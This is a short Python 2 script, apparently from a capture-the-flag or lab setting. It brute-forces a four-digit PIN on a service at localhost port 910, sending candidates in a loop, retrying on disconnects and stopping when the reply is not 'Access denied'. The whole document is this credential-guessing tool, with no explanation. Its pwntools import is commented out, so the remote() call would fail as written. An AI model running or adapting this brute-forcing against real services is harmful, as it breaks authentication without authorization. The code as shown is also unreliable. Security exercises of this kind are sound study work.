#!/usr/bin/python

#from pwn import *
import time
import sys

i = int(sys.argv[1])
j = int(sys.argv[2])
while True:
    m = ""
    if i < j:
        pin = str(i).zfill(4)
        p = remote("127.0.0.1", 910)
        try:
            p.recvuntil("[$]", timeout=30)
            p.sendline("%s" % pin)
        except EOFError:
            print("Retry on %d" % i)
            continue
        try:
            m = p.recvline(timeout=10)
            print m
        except EOFError:
            print("Retry on %d" % i)
            continue
        if "Access denied, disconnecting client" not in m:
            print m
            exit(0)
        print "Doing ... " + str(i)
        i = i + 1
    else:
        print("We're done.")
        exit(0)
    p.close()

